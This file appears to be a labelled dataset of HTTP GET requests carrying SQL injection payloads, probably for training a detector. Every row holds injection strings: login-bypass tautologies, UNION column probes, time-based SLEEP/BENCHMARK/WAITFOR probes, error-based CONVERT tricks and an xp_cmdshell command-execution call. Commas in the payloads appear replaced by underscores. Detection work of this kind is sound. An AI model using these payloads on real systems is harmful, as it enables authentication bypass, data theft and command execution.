97,2,200,5755,38,12,23,2,1,GET ?mail=') or ('a'='a&pass=OR 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(500000000/2)))) HTTP/1.1
171,1,200,2552,82,4,33,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116)))# HTTP/1.1
62,2,200,2648,14,17,17,1,1,GET ?email='=' 'or' and '=' 'or'&phone= ORDER BY 8--  HTTP/1.1
76,2,200,7701,7,43,12,2,1,GET ?email=or 1=1--&phone=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
136,2,200,4357,65,9,24,1,1,GET ?email= ORDER BY 19 &pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))--  HTTP/1.1
252,2,200,7690,113,7,48,1,1,GET ?phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107)))-- &id= ORDER BY 31337  HTTP/1.1
129,2,200,6922,30,10,20,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22-- &tel=' and 1='1 HTTP/1.1
36,1,200,1279,7,9,11,1,1,GET ?id=admin') or '1'='1'# HTTP/1.1
86,2,200,6629,31,9,16,1,1,GET ?name="*"&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6--  HTTP/1.1
115,2,200,7906,54,7,19,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6-- &id= UNION SELECT @@VERSION_SLEEP(5)_3 HTTP/1.1
55,2,200,5658,7,12,20,1,1,GET ?id='or 1=1 or ''='&id=")) or (("x"))=(("x HTTP/1.1
43,1,200,3725,7,15,7,1,1,GET ?password=admin") or "1"="1"-- HTTP/1.1
158,2,200,2595,45,9,15,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
20,1,200,5550,7,2,5,1,1,GET ?id=' ' HTTP/1.1
42,2,200,2409,7,14,11,1,1,GET ?phone=' or sleep(5)#&id=" -- HTTP/1.1
224,2,200,4423,94,14,51,1,1,GET ?email=') or ('x')=('x&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))--  HTTP/1.1
76,1,200,5171,31,8,12,1,1,GET ?password= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5# HTTP/1.1
102,2,200,5392,38,9,21,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9-- &phone= WHERE 1=1 AND 1=0-- HTTP/1.1
69,1,200,1197,38,2,12,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88)))--  HTTP/1.1
57,2,200,4556,14,11,16,1,1,GET ?tel= ORDER BY 5-- &name=")) or (("x"))=(("x HTTP/1.1
141,1,200,4037,31,5,12,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
45,2,200,1152,14,10,8,1,1,GET ?email= ORDER BY 23-- &phone=" # HTTP/1.1
219,1,200,5524,149,5,17,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
248,2,200,5891,69,12,29,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24# HTTP/1.1
101,3,200,2712,21,8,11,1,1,GET ?id=' or ''&'&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
213,1,200,1730,99,2,39,1,1,GET ?id= AND 5650=CONVERT(INT_(SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) (SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113))) HTTP/1.1
80,2,200,7437,14,43,8,1,1,GET ?name=select system_user from sysibm.sysdummy1;&phone= ORDER BY 3#  HTTP/1.1
117,2,200,4341,21,15,10,2,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22-- &pass=admin' or 1=1/* HTTP/1.1
117,2,200,5302,49,7,17,1,1,GET ?name= UNION ALL SELECT USER()-- &tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11 HTTP/1.1
54,2,200,2229,7,17,12,1,1,GET ?mail=") or "1"="1"--&pass=admin' or 1=1# HTTP/1.1
89,2,200,1964,33,10,16,1,1,GET ?mail= OR x=y-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6 HTTP/1.1
189,2,200,6419,74,28,35,1,1,GET ?phone=' group by password having 1=1--&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))# HTTP/1.1
133,2,200,1239,37,10,19,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21-- &phone= ORDER BY 5--  HTTP/1.1
60,1,200,7192,7,37,8,1,1,GET ?email=select current_setting('log_statement'); HTTP/1.1
219,2,200,5543,101,10,41,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))#&phone= ORDER BY 7  HTTP/1.1
119,2,200,6183,54,10,23,1,1,GET ?mail= or 1=1#&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))# HTTP/1.1
147,2,200,4923,88,6,19,1,1,GET ?id=AND 1&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
51,2,200,2780,7,16,11,1,1,GET ?email=" or "x"="x&phone=) or ('1′='1– HTTP/1.1
209,1,200,3113,78,11,59,1,1,GET ?account= AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC) HTTP/1.1
289,2,200,6520,180,7,35,1,1,GET ?name= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))# HTTP/1.1
22,1,200,7832,7,4,5,2,1,GET ?code='/* HTTP/1.1
97,1,200,7679,21,7,3,2,1,GET login/?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
98,2,200,1095,30,9,16,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14&tel=or 1=1 HTTP/1.1
38,1,200,7385,14,7,5,2,1,GET login/?id= ORDER BY 13--  HTTP/1.1
52,2,200,2317,7,19,16,1,1,GET ?email=') or ('x')=('x&pass=" or true-- HTTP/1.1
38,1,200,4463,7,14,9,1,1,GET ?account=') or sleep(5)=' HTTP/1.1
53,2,200,3784,21,7,8,1,1,GET ?name= ORDER BY 25 &tel=1' ORDER BY 2--  HTTP/1.1
251,2,200,4909,106,14,51,2,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107)))-- &tel=admin' or 1=1/* HTTP/1.1
59,2,200,2968,24,9,9,1,1,GET ?email=' –&pass= AS INJECTX WHERE 1=1 AND 1=0# HTTP/1.1
201,2,200,5164,90,8,43,1,1,GET ?id=' or ''='&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65))) HTTP/1.1
38,1,200,6605,7,15,5,2,1,GET ?username=admin" or 1=1/* HTTP/1.1
134,2,200,4542,48,19,25,1,1,GET ?mail= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8&pass=')) or benchmark(10000000_MD5(1))# HTTP/1.1
228,2,200,2338,90,34,43,1,1,GET ?phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65)))&id=select current_setting('hba_file'); HTTP/1.1
42,4,200,4787,12,12,11,1,1,GET ?username=&&SLEEP(5)&pass=' # HTTP/1.1
84,2,200,3976,44,8,13,1,1,GET ?code= ORDER BY 16 &code= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)--  HTTP/1.1
38,1,200,5384,14,8,5,1,1,GET ?username= ORDER BY 18--  HTTP/1.1
126,2,200,7752,30,14,21,1,1,GET ?id=' or 'one'='one–&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
41,2,200,5977,14,6,8,1,1,GET ?id= ORDER BY 8 &id=or 1=1-- HTTP/1.1
182,2,200,6292,44,8,17,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24-- &code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16 HTTP/1.1
239,1,200,4298,110,2,48,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))--  HTTP/1.1
134,2,200,1597,30,9,19,1,1,GET ?tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24-- &name= or 0=0 # HTTP/1.1
131,1,200,4945,31,5,11,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
242,2,200,2527,145,7,27,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6&tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
386,2,200,5173,212,10,59,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106)))#&phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
107,2,200,3128,21,12,7,1,1,GET ?email= or 1=1–&phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
32,1,200,2320,7,6,5,1,1,GET ?code=" or "1"="1"# HTTP/1.1
32,1,200,3054,14,4,3,1,1,GET ?user= ORDER BY 13  HTTP/1.1
32,1,200,3744,14,4,3,1,1,GET ?user= ORDER BY 13  HTTP/1.1
62,2,200,4726,16,13,11,1,1,GET ?id=benchmark(50000000_MD5(1))&id= ORDER BY 19--  HTTP/1.1
20,2,200,1500,7,2,6,1,1,GET ?id='&' HTTP/1.1
25,1,200,2528,10,5,3,1,1,GET ?phone=AND 1 HTTP/1.1
119,2,200,6336,41,16,17,1,1,GET ?name=" or "1"="1&tel= RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' HTTP/1.1
30,1,200,7729,7,6,6,1,1,GET ?code=" or 1=1 -- HTTP/1.1
106,1,200,2135,46,5,15,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12 HTTP/1.1
106,1,200,5317,46,5,15,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12 HTTP/1.1
191,2,200,4564,60,12,21,1,1,GET ?mail=1 AND (SELECT * FROM Users) = 1	&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
28,1,200,1006,7,10,5,1,1,GET ?mail=or true-- HTTP/1.1
28,1,200,2305,7,10,5,1,1,GET ?mail=or true-- HTTP/1.1
98,1,200,5157,30,8,14,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
50,1,200,6275,24,4,7,1,1,GET ?user= AS INJECTX WHERE 1=1 AND 1=1-- HTTP/1.1
33,1,200,3751,7,11,5,1,1,GET ?user=admin" or 1=1# HTTP/1.1
154,1,200,2691,46,4,16,1,1,GET ?user= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28# HTTP/1.1
154,1,200,7315,46,4,16,1,1,GET ?user= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28# HTTP/1.1
114,1,200,7376,30,4,13,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
181,2,200,4169,35,4,7,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22-- &id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
50,2,200,7247,14,12,11,1,1,GET ?mail= ORDER BY 30-- &pass=' or a=a-- HTTP/1.1
127,2,200,4781,38,9,17,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17-- &pass= ORDER BY 1--  HTTP/1.1
37,1,200,3466,14,8,4,1,1,GET ?username= ORDER BY 26#  HTTP/1.1
130,2,200,6563,30,14,19,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22&tel=' or sleep(5)# HTTP/1.1
97,1,200,6845,46,5,15,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
133,2,200,4514,44,6,19,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15-- &pass= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
41,1,200,2886,19,7,7,1,1,GET ?account=ORDER BY SLEEP(5)-- HTTP/1.1
142,2,200,5590,21,37,7,1,1,GET ?code=select name from sysibm.systables;&code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
229,2,200,6000,98,9,47,1,1,GET ?name=") or ("1"="1&tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112)))--  HTTP/1.1
55,2,200,3953,7,27,11,1,1,GET ?mail=' or 1=1;#&pass=select @@servernamee HTTP/1.1
118,2,200,5015,38,8,11,1,1,GET ?code= AS INJECTX WHERE 1=1 AND 1=1--&code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17--  HTTP/1.1
51,2,200,7541,19,8,11,1,1,GET ?id=" or 1=1--&pass=ORDER BY SLEEP(5)# HTTP/1.1
94,2,200,2846,31,11,17,1,1,GET ?name='or'1=1&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9# HTTP/1.1
119,2,200,2079,46,19,19,1,1,GET ?username=admin' or 1=1&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9 HTTP/1.1
52,2,200,5311,14,15,9,1,1,GET ?code=' or sleep(5)#&code= ORDER BY 16  HTTP/1.1
208,2,200,6532,55,9,23,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16#&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
35,1,200,5732,7,11,10,1,1,GET ?account=') or ('x'='x HTTP/1.1
231,2,200,1422,69,11,28,1,1,GET ?account= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24# HTTP/1.1
71,2,200,1480,21,9,10,1,1,GET ?phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10&id=' or ''*' HTTP/1.1
102,2,200,5323,31,13,16,1,1,GET ?account=' or 0=0 –&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10# HTTP/1.1
196,2,200,7530,60,8,20,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28# HTTP/1.1
158,2,200,6479,70,10,30,1,1,GET ?mail=" or ""^"&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))# HTTP/1.1
54,2,200,5591,7,18,16,1,1,GET ?id=admin' or '1'='1'#&id=admin' or 1=1-- HTTP/1.1
29,1,200,1748,7,6,4,1,1,GET ?code=" or 0=0 – HTTP/1.1
82,2,200,6496,44,6,13,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)-- &pass= ORDER BY 18  HTTP/1.1
166,2,200,6462,31,36,15,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25&name=select name from sysibm.systables; HTTP/1.1
83,1,200,3238,30,7,14,2,1,GET login/?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11# HTTP/1.1
168,2,200,2773,39,7,17,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30-- &id= WHERE 1=1 AND 1=1 HTTP/1.1
132,2,200,5941,30,11,19,2,1,GET ?id=admin' or 1=1/*&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23# HTTP/1.1
39,1,200,2437,7,11,6,2,1,GET ?user=admin") or "1"="1"/* HTTP/1.1
249,2,200,3766,99,25,35,1,1,GET ?tel=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055&name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116))) HTTP/1.1
25,1,200,5857,7,7,4,1,1,GET ?id=admin" # HTTP/1.1
50,2,200,2778,21,7,5,1,1,GET ?name= ORDER BY 21 &tel= ORDER BY 26  HTTP/1.1
76,2,200,1250,17,37,12,1,1,GET ?name=' or 'a'='a&phone=SELECT schemaname FROM syscat.schemata; HTTP/1.1
45,1,200,5410,7,16,12,1,1,GET ?pass=));waitfor delay '0:0:5'-- HTTP/1.1
146,2,200,1839,53,11,18,1,1,GET ?account= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18&pass= ORDER BY 26#  HTTP/1.1
117,2,200,3735,28,7,6,1,1,GET ?name= ORDER BY 6# &tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
54,1,200,5625,7,32,8,1,1,GET ?password=select current_setting('port'); HTTP/1.1
32,1,200,2419,12,6,7,1,1,GET ?pass=or SLEEP(5)-- HTTP/1.1
86,2,200,7879,7,48,15,1,1,GET ?id=select current_setting('log_statement');&id=waitfor delay '00:00:05'# HTTP/1.1
61,2,200,6004,22,11,12,1,1,GET ?email=-1 UNION SELECT 1 INTO @_@_@&pass='or'1=1 HTTP/1.1
34,1,200,3436,7,6,11,2,1,GET ?user=') or '1'='1'/* HTTP/1.1
125,2,200,4666,38,9,15,1,1,GET ?email= ORDER BY 12-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
48,2,200,1686,14,13,7,1,1,GET ?tel=" or true--&name= ORDER BY 16  HTTP/1.1
45,1,200,1188,9,11,9,1,1,GET ?id=benchmark(50000000_MD5(1))-- HTTP/1.1
106,1,200,6389,31,7,13,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
129,2,200,6299,44,10,16,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18#&phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2 HTTP/1.1
227,2,200,6747,70,9,28,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
28,1,200,3281,7,6,6,1,1,GET ?pass= or 1=1-- HTTP/1.1
146,2,200,4455,30,15,22,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26-- &pass=' or 'a'='a HTTP/1.1
156,2,200,7078,54,8,25,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10-- &code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13 HTTP/1.1
233,2,200,3877,149,9,21,1,1,GET ?tel=' or 0=0 –&name= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
37,1,200,4865,7,12,9,1,1,GET ?email=admin') or '1'='1 HTTP/1.1
37,1,200,5975,7,12,9,1,1,GET ?email=admin') or '1'='1 HTTP/1.1
142,2,200,6833,32,32,23,1,1,GET ?phone= and (select substring(@@version_3_1))='X'&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14# HTTP/1.1
102,2,200,5765,21,16,9,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16#&phone=admin" or "1"="1"-- HTTP/1.1
106,2,200,1469,21,19,7,1,1,GET ?username=admin" or "1"="1"#&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
